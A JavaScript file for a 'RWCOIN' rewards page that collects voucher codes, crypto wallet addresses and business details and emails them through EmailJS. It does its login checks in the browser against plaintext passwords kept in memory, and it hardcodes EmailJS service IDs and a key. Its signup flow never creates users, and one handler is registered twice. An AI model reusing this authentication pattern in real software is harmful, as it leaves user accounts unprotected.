document.addEventListener('DOMContentLoaded', () => {
    const users = {}; // Object to store user data with email as the key

    // Screens
    const openScreen = document.getElementById('openScreen');
    const signupScreen = document.getElementById('signupScreen');
    const rewardScreen = document.getElementById('rewardScreen');
    const transactionScreen = document.getElementById('transactionScreen');

    // Input Elements
    const openEmail = document.getElementById('openEmail');
    const openPassword = document.getElementById('openPassword');
    const signupEmail = document.getElementById('signupEmail');
    const signupPassword = document.getElementById('signupPassword');
    const confirmPassword = document.getElementById('confirmPassword');
    const nameInput = document.getElementById('name');
    const rewardEmail = document.getElementById('rewardEmail');
    const rewardName = document.getElementById('rewardName');
    const voucherCode = document.getElementById('voucherCode');
    const walletAddress = document.getElementById('walletAddress');
    const businessName = document.getElementById('businessName');
    const businessEmail = document.getElementById('businessEmail');

    // EmailJS Config
    const serviceID = "service_4b371jn";
    const templateID = "template_y0f3pw9";
    const userID = "sz2ImWOwFnVKy4qrF"; // EmailJS API Key

   // Clear login fields on page load
openEmail.value = '';
openPassword.value = '';

// Login Functionality
document.getElementById('loginBtn').addEventListener('click', () => {
    const email = openEmail.value.trim();
    const password = openPassword.value.trim();

    if (users[email] && users[email].password === password) {
        openScreen.classList.add('hidden');
        rewardScreen.classList.remove('hidden');

        // Pre-fill reward email and name
        rewardEmail.value = email;
        rewardName.value = users[email].name;
    } else {
        alert("Invalid email or password.");
    }
});

// Back to Login Functionality (Logout or Navigate Back)
document.getElementById('backToLogin').addEventListener('click', () => {
    rewardScreen.classList.add('hidden');
    openScreen.classList.remove('hidden');

    // Reset email and password fields
    openEmail.value = ''; // Clear the email field
    openPassword.value = '';
});
    // Reward Submission Functionality
    document.getElementById('submitRewardBtn').addEventListener('click', () => {
        const name = rewardName.value.trim();
        const email = rewardEmail.value.trim();
        const voucher = voucherCode.value.trim();
        const wallet = walletAddress.value.trim();
        const business = businessName.value.trim();
        const businessEmailValue = businessEmail.value.trim();

        if (!name || !email || !voucher || !wallet || !business || !businessEmailValue) {
            alert("Please complete all fields.");
            return;
        }

        transactionScreen.classList.remove('hidden');
        rewardScreen.classList.add('hidden');

        document.getElementById('transName').textContent = name;
        document.getElementById('transEmail').textContent = email;
        document.getElementById('transVoucherCode').textContent = voucher;
        document.getElementById('transWallet').textContent = wallet;
        document.getElementById('transBusinessName').textContent = business;
        document.getElementById('transBusinessEmail').textContent = businessEmailValue;

        voucherCode.value = '';
        walletAddress.value = '';
        businessName.value = '';
        businessEmail.value = '';

        // EmailJS Send Email
        emailjs.send(serviceID, templateID, {
            name: name,
            email: email,
            voucher_code: voucher,
            wallet_address: wallet,
            business_name: business,
            business_email: businessEmailValue,
        }, userID)
        .then(() => {
            alert("Reward data has been emailed to RWCOIN successfully!");
        })
        .catch(error => {
            console.error("Error sending email:", error);
            alert("Failed to send reward data. Please try again.");
        });
    });

    // Back Button Handlers
    document.getElementById('backToReward').addEventListener('click', () => {
        transactionScreen.classList.add('hidden');
        rewardScreen.classList.remove('hidden');
    });

    document.getElementById('backToLogin').addEventListener('click', () => {
        rewardScreen.classList.add('hidden');
        openScreen.classList.remove('hidden');

        openEmail.value = '';
        openPassword.value = '';
    });

    document.getElementById('signupBtn').addEventListener('click', () => {
        openScreen.classList.add('hidden');
        signupScreen.classList.remove('hidden');
    });

    document.getElementById('backToOpen').addEventListener('click', () => {
        signupScreen.classList.add('hidden');
        openScreen.classList.remove('hidden');
    });
});
